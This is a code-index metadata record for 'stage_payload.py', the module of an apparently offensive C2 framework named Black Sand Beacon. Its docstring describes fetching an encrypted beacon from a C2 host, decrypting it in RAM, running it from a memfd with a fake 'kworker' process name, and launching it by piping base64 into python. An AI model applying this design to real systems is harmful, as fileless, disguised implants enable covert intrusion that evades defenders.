{"uid":"c2/stage_payload.py","name":"stage_payload.py","qualname":"c2/stage_payload.py","kind":"module","file":"c2/stage_payload.py","line":1,"end_line":114,"language":"py","signature":"","params":[],"returns":"","decorators":[],"bases":[],"modifiers":[],"visibility":"public","doc":{"summary":"Black Sand Beacon diskless stager.","description":"Fetches encrypted beacon ELF and config.json from C2 staging endpoints,\ndecrypts them in RAM, and executes the beacon from an anonymous memfd.\nNothing is ever written to disk.\n\nPayloads are protected with AES-256-CFB + HMAC-SHA256 using keys derived\nfrom the staging token via HKDF-SHA256 (salt \"blacksandbeacon-stage-v2\"),\nmatching c2/server.py. Token is sent in Authorization header (not URL).\n\nEnvironment:\n    BSB_STAGE_URL          base C2 URL (e.g. https://c2.example:7070)\n    BSB_STAGE_TOKEN        staging token (same as server.stage_token)\n    BSB_STAGE_ARGV0        argv[0] for the beacon (default \"kworker/u8:2\")\n    BSB_STAGE_INSECURE_TLS set to 1 to skip TLS verification (lab only)\n\nUsage:\n    python3 stage_payload.py\n    echo <b64> | base64 -d | BSB_STAGE_URL=... BSB_STAGE_TOKEN=... python3 -","params":[],"returns":null,"yields":null,"raises":[],"attributes":[],"examples":[],"notes":[],"see_also":[],"deprecated":"","since":"","style":"plain"},"parent":"","members":["c2/stage_payload.py::HKDF_SALT","c2/stage_payload.py::HKDF_INFO_ENC","c2/stage_payload.py::HKDF_INFO_HMAC","c2/stage_payload.py::hkdf_sha256","c2/stage_payload.py::main"],"inferred_raises":[],"returns_value":null,"value":"","base_uids":[],"subclasses":[],"calls":[],"called_by":[]}
